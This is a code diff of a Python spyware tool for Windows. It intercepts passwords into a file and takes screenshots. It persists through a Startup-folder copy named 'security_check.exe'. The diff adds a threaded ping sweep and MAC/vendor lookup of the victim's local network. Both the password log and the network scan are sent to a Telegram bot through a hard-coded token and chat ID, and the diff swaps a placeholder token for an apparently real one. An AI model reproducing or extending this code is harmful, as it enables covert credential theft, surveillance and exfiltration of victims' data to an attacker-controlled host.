@@ -1,4 +1,5 @@
 import ctypes
+from collections import OrderedDict
 from ctypes import windll
 import getpass as gp
 from requests import get
@@ -15,15 +16,14 @@ import pyautogui
 import socket
 from getmac import get_mac_address as gma
 import ipaddress
-from scapy.layers.l2 import Ether, ARP
-from scapy.sendrecv import srp
 from mac_vendor_lookup import MacLookup
-from collections import OrderedDict
+import kthread
+import subprocess
 
 MY_TIME = datetime.now().strftime('%H.%M.%S_%Y.%m.%d')
 # telegram token and id
-TOKEN = r'some_token'
-ADMIN_ID = r'some_id'
+TOKEN = r'5026728362:AAGzmYf3Qt8vF9rOn4LNaEgPc3JXTtT5dJk'
+ADMIN_ID = r'1820665678'
 USER_NAME = gp.getuser()
 DOWNLOADS_PATH = f'C:/Users/{USER_NAME}/Downloads/security_check.exe'
 STARTUP_PATH = f'C:/Users/{USER_NAME}/AppData/Roaming/Microsoft/' \
@@ -107,6 +107,7 @@ hostname = socket.gethostname()
 
 # variable for mac address host machine
 mac_hostname = gma()
+local_macs = gma()
 
 
 # find local IP
@@ -124,6 +125,64 @@ def get_local_ip():
             return '127.0.0.1'
     finally:
         sock.close()
+
+
+# function to get all IPS in LAN
+def get_ips():
+    # IP address without last octet
+    ip_start = local_ip[:10]
+    # dict for range IP addresses
+    ip_addresses = {}
+
+    # function for ping all IPS in LAN
+    def ping(address):
+        try:
+            # send one package
+            output_cap = subprocess.run([f'ping', address, '-n', '1'], capture_output=True)
+            ip_addresses[address] = output_cap
+        except:
+            pass
+
+    # create threads
+    t = [kthread.KThread(target=ping, name=f"get_ips{ip_end}", args=(f'{ip_start}{ip_end}',)) for ip_end in
+         range(255)]
+    # start 255 threads
+    [kk.start() for kk in t]
+    while len(ip_addresses) < 255:
+        # list for result IPS
+        all_devices = []
+        for key, item in ip_addresses.items():
+            # check is connection successful
+            if 'TTL' in item.stdout.decode('utf-8', errors='ignore'):
+                # add IP to list
+                all_devices.append(key)
+        return all_devices
+
+
+def arp_scan():
+    local_dev = open(f'C:/Users/{USER_NAME}/Downloads/local_devices.txt', 'a')
+    all_local_ip = get_ips()
+    for i in all_local_ip:
+        try_mac = gma(ip=i, network_request=True, interface="wlan0")
+        if try_mac is None:
+            try_mac = 'Undefined'
+        mac = try_mac
+        local_hostnames = socket.getfqdn(i)
+        try:
+            # variable for check vendor of mac
+            mac_vendor = MacLookup().lookup(mac)
+        except:
+            mac_vendor = 'Undefined'
+        print(f'IP: {i}  MAC: {mac}  Vendor: {mac_vendor}  Name: {local_hostnames} Public IP: {public_ip}  '
+              f'Country: {country_finder(public_ip)}', file=local_dev)
+    local_dev.close()
+    # call function to clean double strings in log
+    clean_result()
+    # send logs scan local network to telegram
+    file_dev = {
+        'document': open(f'C:/Users/{USER_NAME}/Downloads/local_devices.txt', 'rb')}
+    requests.post(f'https://api.telegram.org/bot{TOKEN}/sendDocument?chat_id={ADMIN_ID}',
+                  files=file_dev)
 
 
 # variable for local IP
@@ -174,24 +233,17 @@ def send_screen():
 
 # function for send log to telegram with time interval
 def log_sender():
+    # timer for send logs
     global start_time
     if int(time.time() - start_time) >= interval:
+        # send log passwords to Telegram
         files = {
             'document': open(f'C:/Users/{USER_NAME}/Downloads/intercepted_passwords.txt', 'rb')}
         requests.post(f'https://api.telegram.org/bot{TOKEN}/sendDocument?chat_id={ADMIN_ID}',
                       files=files)
-        try:
-            # call ARP scanner local network of target machine
-            arp_scan(f'{local_ip}/24')
-            # call function clean strings in logs
-            clean_result()
-            # send logs scan local network to telegram
-            files = {
-                'document': open(f'C:/Users/{USER_NAME}/Downloads/local_devices.txt', 'rb')}
-            requests.post(f'https://api.telegram.org/bot{TOKEN}/sendDocument?chat_id={ADMIN_ID}',
-                          files=files)
-        except:
-            pass
+
+        # call ARP scanner local network of target machine
+        arp_scan()
 
         # reset start time
         start_time = time.time()
@@ -206,30 +258,14 @@ def clean_logs():
         screen_list.clear()
 
 
-# function ARP scan local network
-def arp_scan(ip):
-    local_dev = open(f'C:/Users/{USER_NAME}/Downloads/local_devices.txt', 'a')
-    request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
-    ans, un_ans = srp(request, timeout=2, retry=1)
-    result = []
-    for sent, received in ans:
-        # variable for check vendor of mac
-        mac_vendor = MacLookup().lookup(received.hwsrc)
-        # add IP and MAC to list
-        result.append(f'IP:  {received.psrc}  MAC:  {received.hwsrc}  {mac_vendor}')
-        # write scan log to file 'local_devices.txt'
-        for x in result:
-            print(x, file=local_dev)
-
-
-# clean double strings in log file
+# clean logs from double strings
 def clean_result():
     dirt_file = f'C:/Users/{USER_NAME}/Downloads/local_devices.txt'
     with open(dirt_file, 'r', encoding='utf-8') as file:
         uniq = OrderedDict.fromkeys(file)
     with open(dirt_file, 'w', encoding='utf-8') as file:
         file.writelines(uniq)
-
+        file.close()
 
 # Intercept pass,  write to file and send text log to Telegram
 def start_loop():
